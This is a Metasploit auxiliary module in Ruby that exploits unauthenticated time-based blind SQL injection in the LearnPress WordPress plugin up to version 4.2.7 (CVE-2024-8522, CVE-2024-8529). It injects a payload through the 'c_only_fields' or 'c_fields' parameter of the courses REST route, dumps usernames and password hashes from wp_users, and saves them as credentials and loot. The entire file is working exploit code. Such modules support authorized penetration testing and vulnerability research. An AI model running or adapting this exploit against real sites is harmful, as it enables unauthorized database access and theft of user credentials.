##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::SQLi
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress LearnPress Unauthenticated SQLi (CVE-2024-8522, CVE-2024-8529)',
        'Description' => %q{
          The LearnPress WordPress LMS Plugin up to version 4.2.7 is vulnerable to SQL injection via
          the 'c_only_fields' and 'c_fields' parameters. This allows unauthenticated attackers to exploit blind SQL injections
          and extract sensitive information.
        },
        'Author' => [
          'abrahack',          # Vulnerability Discovery
          'Valentin Lobstein'  # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-8522'],
          ['CVE', '2024-8529'],
          ['URL', 'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/learnpress/learnpress-wordpress-lms-plugin-427-unauthenticated-sql-injection-via-c-only-fields'],
          ['URL', 'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/learnpress/learnpress-wordpress-lms-plugin-427-unauthenticated-sql-injection-via-c-fields']
        ],
        'Actions' => [
          ['CVE-2024-8522', { 'Description' => 'SQL Injection via c_only_fields parameter' }],
          ['CVE-2024-8529', { 'Description' => 'SQL Injection via c_fields parameter' }]
        ],
        'DefaultAction' => 'CVE-2024-8522',
        'DefaultOptions' => { 'SqliDelay' => '2', 'VERBOSE' => true },
        'DisclosureDate' => '2024-09-11',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options [
      OptInt.new('COUNT', [false, 'Number of rows to retrieve', 1]),
    ]
  end

  def run_host(ip)
    sqli_param = action.name.downcase.include?('cve-2024-8522') ? 'c_only_fields' : 'c_fields'
    description = action.name.downcase.include?('cve-2024-8522') ? 'CVE-2024-8522' : 'CVE-2024-8529'

    print_status("Performing SQL injection for #{description} via the '#{sqli_param}' parameter...")

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
      random_negative_number = -Rex::Text.rand_text_numeric(2).to_i
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'vars_get' => {
          'rest_route' => '/learnpress/v1/courses',
          sqli_param => "IF(COUNT(*)!=#{random_negative_number},(#{payload}),0)"
        }
      })
      fail_with(Failure::Unreachable, 'Connection failed') unless res
    end

    fail_with(Failure::NotVulnerable, 'Target is not vulnerable or delay is too short.') unless @sqli.test_vulnerable

    columns = ['user_login', 'user_pass']
    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])

    table = Rex::Text::Table.new(
      'Header' => 'wp_users',
      'Indent' => 4,
      'Columns' => columns
    )

    loot_data = ''

    data.each do |user|
      table << user
      loot_data << "Username: #{user[0]}, Password Hash: #{user[1]}\n"

      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user[0],
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),
        private_data: user[1],
        service_name: 'WordPress',
        address: ip,
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
    end

    print_good('Dumped user data:')
    print_line(table.to_s)

    loot_path = store_loot(
      'wordpress.users',
      'text/plain',
      ip,
      loot_data,
      'wp_users.txt',
      'WordPress Usernames and Password Hashes'
    )

    print_good("Loot saved to: #{loot_path}")
  end
end
